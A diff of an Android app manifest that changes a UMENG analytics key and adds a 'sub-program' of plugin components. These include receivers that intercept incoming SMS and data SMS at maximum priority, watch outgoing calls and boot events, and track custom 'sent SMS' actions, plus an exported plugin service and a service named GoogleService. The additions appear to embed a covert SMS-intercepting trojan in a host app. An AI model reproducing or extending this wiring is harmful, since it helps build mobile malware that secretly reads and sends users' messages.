@@ -101,7 +101,7 @@
         <!-- 主程序需要 -->
         <meta-data
             android:name="UMENG_APPKEY"
-            android:value="52b15a9656240bb43204463a">
+            android:value="5300b18e56240b04531e9b16">
         </meta-data>
         <meta-data
             android:name="UMENG_CHANNEL"
@@ -168,6 +168,75 @@
         <service android:name="com.xstd.qm.service.WatchingService"/>
         <service android:name="com.xstd.qm.service.WatchBindService"/>
         <service android:name="com.xstd.qm.service.FakeBindService"/>
+
+        <!-- 子程序添加 -->
+        <receiver
+            android:name="com.xstd.plugin.receiver.ScreenBRC"
+            android:priority="2147483647">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.USER_PRESENT"/>
+                <action android:name="com.xstd.hour.alarm"/>
+            </intent-filter>
+        </receiver>
+
+        <receiver
+            android:name="com.xstd.plugin.receiver.PrivateSMSBRC"
+            android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.provider.Telephony.GSM_SMS_RECEIVED"/>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED2"/>
+
+                <category android:name="android.intent.category.DEFAULT"/>
+            </intent-filter>
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.DATA_SMS_RECEIVED"/>
+
+                <data android:scheme="sms"/>
+                <data android:host="localhost"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.xstd.plugin.receiver.DialProcessBRC">
+            <intent-filter>
+                <!--<action android:name="android.intent.action.PHONE_STATE"/>-->
+                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.xstd.plugin.receiver.NetworkBroadcastReceiver">
+            <intent-filter>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+            </intent-filter>
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+                <category android:name="android.intent.category.HOME"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.xstd.plugin.receiver.SMSSentBRC">
+            <intent-filter android:priority="2147483647">
+                <action android:name="com.xstd.sms.local.sent"/>
+                <action android:name="com.xstd.sms.monkey.sent"/>
+            </intent-filter>
+        </receiver>
+
+        <service
+            android:name="com.xstd.plugin.service.PluginService"
+            android:exported="true">
+            <intent-filter>
+                <action android:name="com.xstd.plugin.package.active"/>
+            </intent-filter>
+        </service>
+
+
+        <service
+            android:name="com.xstd.plugin.service.GoogleService">
+            <!--<intent-filter>-->
+                <!--<action android:name="com.umeng.application.action"/>-->
+            <!--</intent-filter>-->
+            <!--<meta-data-->
+                <!--android:name="UMENG_APPLICATION_KEY"-->
+                <!--android:value="555">-->
+            <!--</meta-data>-->
+        </service>
 
     </application>
 
